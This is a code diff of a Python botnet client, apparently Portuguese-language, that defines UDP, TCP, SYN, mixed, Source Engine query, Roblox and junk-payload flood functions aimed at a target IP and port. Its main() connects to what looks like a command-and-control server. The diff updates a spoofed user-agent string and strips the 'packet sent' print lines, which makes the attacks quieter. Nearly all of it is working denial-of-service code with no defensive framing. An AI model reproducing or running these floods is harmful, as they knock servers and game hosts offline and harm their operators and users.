@@ -22,7 +22,7 @@ base_user_agents = [
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
 ]
 
 def rand_ua():
@@ -305,7 +305,6 @@ def attack_udp(ip, port, secs, size):
         dport = random.randint(1, 65535) if port == 0 else port
         data = random._urandom(size)
         s.sendto(data, (ip, dport))
-        print('Pacote UDP Enviado')
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
@@ -314,7 +313,6 @@ def attack_tcp(ip, port, secs, size):
             s.connect((ip, port))
             while time.time() < secs:
                 s.send(random._urandom(size))
-                print('Pacote TCP Enviado')
         except:
             pass
 
@@ -331,7 +329,6 @@ def attack_SYN(ip, port, secs):
             
             while time.time() < secs:
                 s.send(pkt)
-                print('Pacote SYN Enviado')
         except:
             s.close()
 
@@ -345,7 +342,6 @@ def attack_tup(ip, port, secs, size):
             tcp.connect((ip, port))
             udp.sendto(data, (ip, dport))
             tcp.send(data)
-            print('Pacote TUP Enviado')
         except:
             pass
 
@@ -359,7 +355,6 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote HEX Enviado')
 
 def attack_vse(ip, port, secs):
     payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
@@ -368,7 +363,6 @@ def attack_vse(ip, port, secs):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote VSE Enviado')
 
 
 def attack_roblox(ip, port, secs, size):
@@ -381,7 +375,6 @@ def attack_roblox(ip, port, secs, size):
             hex = "%064x" % ran
             hex = hex[:64]
             s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
-            print('Pacote ROBLOX Enviado')
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
@@ -390,7 +383,6 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote junk enviado')
 
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
